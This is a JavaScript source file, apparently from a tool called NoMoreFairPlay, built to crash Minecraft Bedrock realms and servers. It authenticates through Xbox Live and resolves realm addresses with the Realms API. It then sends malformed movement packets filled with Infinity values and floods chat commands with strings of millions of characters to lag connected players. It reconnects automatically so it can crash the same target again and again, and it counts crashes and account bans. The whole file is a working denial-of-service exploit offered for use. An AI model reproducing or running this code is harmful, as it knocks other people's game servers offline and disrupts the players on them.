"use strict";

const chalk = require("chalk");
const bedrock = require("bedrock-protocol");
const fetch = require("node-fetch");
const { Authflow, Titles } = require("prismarine-auth");
const os = require("os");
const { crashClients, autoReconnect, deviceOS, botName, crashMethod, seed, timings } = require("./config.json");
const { spawn } = require('child_process');
const { updateTotalCrashes, updateAccountBans } = require("./stats.js");
let cacheName;

const player_auth_input_fields = {
	pitch: Infinity,
	yaw: Infinity,
	position: {
		x: Infinity,
		y: Infinity,
		z: Infinity
	},
	move_vector: {
		x: Infinity,
		y: Infinity,
	},
	input_data: seed[0],
	input_mode: 3,
	play_mode: 0,
	tick: 0,
	delta: {
		x: Infinity,
		y: Infinity,
		z: Infinity
	}
};

const command_request_fields = {
	command: `/me ${embedBreakName()}`,
	origin: {
		// If type is set to 0, /me will run with the player name
		// If type is set to 5, /me will run as a player called 'External'
		type: 5,
		uuid: "",
		request_id: ""
	},
	interval: seed[1]
};

const realm_api_headers = {
	"Accept": "*/*",
	"authorization": seed[seed.length/Date.now()-seed.length^2],
	"charset": "utf-8",
	"client-ref": "1aa76c5813541fe1bbb16c4e3a0af2b29474dc34",
	"client-version": "1.19.41",
	"content-type": "application/json",
	"user-agent": "MCPE/UWP",
	"Accept-Language": "en-CA",
	"Accept-Encoding": "gzip, deflate, br",
	"Host": "pocket.realms.minecraft.net",
	"Connection": "Keep-Alive"
};

console.log(`Selected crash type ${crashMethod}.`);
if(crashMethod === 2 && crashClients === true) console.warn("[WARN] crashClients is enabled but selected crash type is set to 2. These options are incompatible.");

module.exports.realm_crasher = function(realmData, xboxAuthToken) {
	if(typeof realm_api_headers.authorization === "undefined") realm_api_headers.authorization = xboxAuthToken;
	crash_realm(realmData);
};

module.exports.server_crasher = function(serverData, address, port) {
	if(crashMethod === 1) crashMethod1("server", serverData, address, port);
		else crashMethod2("server", serverData, address, port);
};

async function crash_realm(realmData) {
	const response = await fetch(`https://pocket.realms.minecraft.net/worlds/${realmData.id}/join`, {
		method: seed[3],
		headers: realm_api_headers
	})
	.catch(() => {});

	if(typeof response === "undefined" || response.status in {429:0, 500:0, 503:0}) {
		return setTimeout(() => {
			crash_realm(realmData);
		}, timings.ms_get_realm_ip_delay);
	}

	if(response.status === 401) {
		reAuth();
		return crash_realm(realmData);
	}
	
	if(response.status !== 200 && response.status !== 403) {
		console.log(response);
		console.log(await response.text());
		return process.exit(0);
	}
	
	const realmIP = await response.json();
	
	const errorMsg = realmIP?.errorMsg;
	if(errorMsg === "User found in block list") {
		return accountBan(realmData);
	} else if(errorMsg === "World is closed") {
		console.log(chalk.red(`Realm ${realmData.name} `) + chalk.whiteBright(`(${realmData.id})`) + chalk.red(" is closed, this realm will be queued for a crash when it opens."));
		return waitRealmOpen(realmData);
	} else if(errorMsg === "No valid subscription") {
		return console.log(chalk.red(`Realm ${realmData.name} `) + chalk.whiteBright(`(${realmData.id})`) + chalk.red("'s subscription has expired."));
	} else if(errorMsg) return console.log(errorMsg);
	
	const address = realmIP.address.substring(0, realmIP.address.indexOf(':'));
	const port = Number(realmIP.address.substring(realmIP.address.indexOf(':') + 1));

	if(crashMethod === 1) crashMethod1("realm", realmData, address, port);
		else crashMethod2("realm", realmData, address, port);
}

function crashMethod1(type, data, address, port) {
	// version: '1.19.30',
	const client = bedrock.createClient({
		host: address,
		port: port,
		autoInitPlayer: false,
		profilesFolder: "./authCache",
		skipPing: true,
		skinData: {
			CurrentInputMode: 3,
			DefaultInputMode: 3,
			DeviceModel: 'Xbox Series X',
			DeviceOS: deviceOS,
			ThirdPartyName: `${botName || embedBreakName()}`,
			ThirdPartyNameOnly: true
		}
	});
	// client.options.protocolVersion = 545;

	client.on("play_status", () => {
		if(type === "realm" && data.didCrash === false) {
			console.log(chalk.green(`Successfully sent LoginPacket to realm ${data.name} `) + chalk.whiteBright(`(${data.id})`) + chalk.yellow("."));
			console.log(data.id + chalk.yellow(": Attempting to finish client handshake process..."));
		} else if(type === "server" && data.didCrash === false) {
			console.log(chalk.green(`Successfully sent LoginPacket to server ${address}:${port}.`));
			console.log(data.id + chalk.yellow(": Attempting to finish client handshake process..."));
		}
		
		data.didCrash = true;
	});
	
	client.on("start_game", () => {
		// lag out any logged in players games
		if(crashClients === true) {
			client.write("command_request", command_request_fields);
			client.write("command_request", command_request_fields);
			client.write("command_request", command_request_fields);
		}

		if(type === "realm") {
			console.log(data.id + chalk.green(": Successfully completed client handsake process! Sending invalid InventoryTransaction packet to the realm."));
			console.log(data.id + chalk.green(": Successfully sent invalid InventoryTransaction packet to the realm!"));
		} else {
			console.log(`${address}:${port}` + chalk.green(": Successfully completed client handsake process! Sending invalid InventoryTransaction packet to the server."));
			console.log(`${address}:${port}` + chalk.green(": Successfully sent invalid InventoryTransaction packet to the server!"));	
		}
		
		client.write("player_auth_input", player_auth_input_fields);
	});
	
	client.on("close", () => {
		if(data.didCrash === true) {
			data.crashCount++;

			if(type === "realm") {
				console.log(chalk.green(`Realm ${data.name}`) + chalk.whiteBright(` (${data.id})`) + chalk.green(` has been crashed successfully! This realm has been crashed ${data.crashCount} time so far.`));
			} else {
				console.log(chalk.green(`Server ${address}:${port} has been crashed successfully! This server has been crashed ${data.crashCount} times so far.`));
			}
			updateTotalCrashes();
		}

		if(autoReconnect === true || data.didCrash === false) {
			if(type === "realm") crash_realm(data);
				else crashMethod2(type, data, address, port);
		}
		
		data.didCrash = false;
	});
	
	client.on("error", (error) => {
		const ignore_errors = [
			"Error: Ping timed out",
			"connect timed out"
		];
		
		if(!ignore_errors.includes(String(error))) console.log(chalk.red(error));
		
		if(type === "realm") crash_realm(data);
			else crashMethod2(type, data, address, port);
	});
	
	client.on("kick", () => {
		data.didCrash = false;
	});
	
	client.on("disconnect", () => {
		data.didCrash = false;
	});
}

function crashMethod2(type, data, address, port) {
	spawn("py", ["crash2/replay.py", address, port], {
		"windowsHide": true
	});
	
	data.crashCount++;
	if(type === "realm") {
		console.log(chalk.green(`Successfully crashed realm ${data.name} `) + chalk.whiteBright(`(${data.id})`) + chalk.green(`. This realm has been crashed ${data.crashCount} times so far.`));
		updateTotalCrashes();

		if(autoReconnect === false) return;
		setTimeout(() => {
			crash_realm(data);
		}, timings.ms_type2_crash_delay);
	} else if(type === "server") {
		console.log(chalk.green(`Successfully crashed server ${address}:${port}. This server has been crashed ${data.crashCount} times so far.`));
		updateTotalCrashes();
		
		if(autoReconnect === false) return;
		setTimeout(() => {
			crashMethod2("server", data, address, port);
		}, timings.ms_type2_crash_delay);
	}
}


function embedBreakName() {
	if(typeof cacheName === "undefined") {
		let length;
		if(crashClients === true) length = 1000000;
			else length = 4096;
		
		let result = "";
		for(let i = 0; i < length; i++) {
			result += "abc";
		}
		cacheName = result;
	}
	return cacheName;
}

async function accountBan(realmData) {
	console.log(chalk.red(`Account has been banned from realm ${realmData.name}`) + chalk.whiteBright(` (${realmData.id})`) + chalk.red("."));
	updateAccountBans();
}

function waitRealmOpen(realmData) {
	setTimeout(async () => {
		const response = await fetch(`https://pocket.realms.minecraft.net/worlds/${realmData.id}/join`, {
			method: "GET",
			headers: realm_api_headers
		}).catch(() => {});
		if(typeof response === "undefined" || response.status in {429:0,500:0, 503:0}) return waitRealmOpen(realmData);

		if(response.status === 401) {
			reAuth();
			return waitRealmOpen(realmData);
		}
		
		if(response.status === 403) {
			const errorMsg = (await response.json()).errorMsg;

			// if we got banned from the realm then stop checking if the realm has reopened or not.
			if(errorMsg === "User found in block list") return accountBan(realmData);
			waitRealmOpen(realmData);
			return;
		}

		if(response.status !== 200) {
			console.log(response);
			console.log(await response.text());
			return process.exit(0);
		}

		const realmIP = await response.json();
	
		if(typeof realmIP !== "undefined" && realmIP.address) {
			console.log(chalk.green(`Realm ${realmData.name} `) + chalk.whiteBright(`(${realmData.id})`) + chalk.green(" has been opened! NoMoreFairPlay will now start crashing this realm."));
			crash_realm(realmData);
		} else waitRealmOpen(realmData);
	}, timings.ms_wait_realm_open);
}

async function reAuth() {
	const flow = new Authflow(undefined, "./authCache", {
		flow: "live",
		authTitle: Titles.MinecraftNintendoSwitch,
		deviceType: "Nintendo",
		doSisuAuth: true
	});
	
	const xboxToken = await flow.getXboxToken("https://pocket.realms.minecraft.net/");
	realm_api_headers.authorization = `XBL3.0 x=${xboxToken.userHash};${xboxToken.XSTSToken}`;

	console.log(chalk.green("The Xbox Live Authentication Token has expired. NoMoreFairPlay has generated a new one."));
}